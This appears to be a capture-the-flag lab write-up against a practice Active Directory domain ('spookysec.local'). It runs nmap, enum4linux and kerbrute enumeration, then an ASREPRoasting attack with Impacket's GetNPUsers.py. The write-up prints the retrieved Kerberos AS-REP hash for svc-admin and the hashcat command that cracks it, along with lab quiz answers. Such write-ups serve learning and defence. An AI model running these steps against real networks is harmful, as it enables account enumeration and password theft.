

scan ports
`nmap -sV -sC -oN nmap.out <target ip>`

Ports 139 and 445 are used by SMB. To enumerate SMB a great tool to use is enum4linux.

scan smb
`enum4linux <ip>`

enumerate for users
`kerbrute userenum -dc <target ip> -d spookysec.local userlist.txt`


After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## **Retrieving Kerberos Tickets**

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called “GetNPUsers.py” (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

For this we use a tool within #impacket

`python3 GetNPUsers.py -no-pass -usersfile ~/Downloads/output.txt -dc-ip 10.10.122.250 spookysec.local/
`

This returns that the user svc-admin can query a ticket with no password! We the the following Kerberos hash:

`$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$63dc9e093d6f3ddfd0074033786ed4d4d6e5f3e9f27be7f98866c0c91c4271c6c8a721eafa9e343a2b9638da64fe71d7563c31e51e6aac0686ba9025ab8ff2d41b8b24f38888cd803c70568744a12daa95cca16b73fa6bc5b20f1fb697b29fd1fe39fa0553ae07ad7e6e2f5232e306ee2abf3ee2ba8ebc704bc96f0d60cd245f96f4caa7c20c3a673fba2b25a384593b01e334560348a146d9168e1fc594b8c59e11382193bd2b3f1c421f9d5fdc61167c8f3bfa18d60fc6fca79923c16b707927719330363b593c28ccc0c7dd2c5e7696b43d45a4bc016341f773805c53f51d2b6ae4a0fa3c3280a18a9d53d9b5fd08337c`

Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC?  _Kerberos 5 AS-REP etype 23_

**What mode is the hash?**

> **_Answer_**: _18200_

`hashcat -m 18200 hash.txt passwordlist.txt`

